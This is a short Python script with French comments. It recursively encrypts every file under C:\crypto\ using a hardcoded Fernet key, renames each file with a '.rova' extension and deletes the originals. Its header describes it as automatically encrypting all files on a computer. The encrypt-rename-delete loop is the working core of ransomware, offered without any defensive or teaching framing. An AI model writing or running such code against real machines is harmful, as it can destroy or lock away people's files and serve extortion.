
# Ce script est conçu pour crypter automatiquement tous les fichiers sur votre ordinateur. 
# Il peut être personnalisé pour crypter un nombre donné de fichiers à la fois ou tous les fichiers. 
# Prenez garde lors du cryptage, car il n'est pas impossible que des fichiers soient perdus en cours de route. 

# Importer le module Cryptography
from cryptography.fernet import Fernet 
import os 


# Donner une clé de chiffrement
# key = Fernet.generate_key()
#Ouvrir le fichier contenant la clé
# f = open("key.key", "wb")
# f.write(key)
# f.close()

# Utiliser cette clé pour crypter/décrypter les fichiers et dossiers
# cipher_suite = Fernet(key)
cipher_suite = Fernet(b'ZVEQ3p53kJuXn2EN-ZyJduwRuBtoYzwTQ8NOjxiCTaY=')

# Parcourir récursivement chaque dossier et ses sous-dossiers pour trouver des fichiers
for root, dirs, files in os.walk("C:\\crypto\\"):  
    # Pour chaque fichier
	for file in files: 
		# Ignorer les fichiers qui ont déjà été traités
		if file.endswith(".rova"): 
			# print(file + " déjà chiffré")
			continue

		# Ouvrir le fichier
		file_path = os.path.join(root, file) 
		with open(file_path, "rb") as f: 
			# Lire le fichier en mode binaire
			data = f.read() 

		# Crypter le fichier
		encrypted_data = cipher_suite.encrypt(data) 

		# Écrire le fichier chiffré
		with open(file_path + ".rova", "wb") as f: 
			f.write(encrypted_data)
		
		# Supprimer l'original
		os.remove(file_path) 

# NOTE : Bien qu'on ait pu crypter le fichier, ne jamais oublier que quelqu'un,avec la clé, peut déchiffrer les données!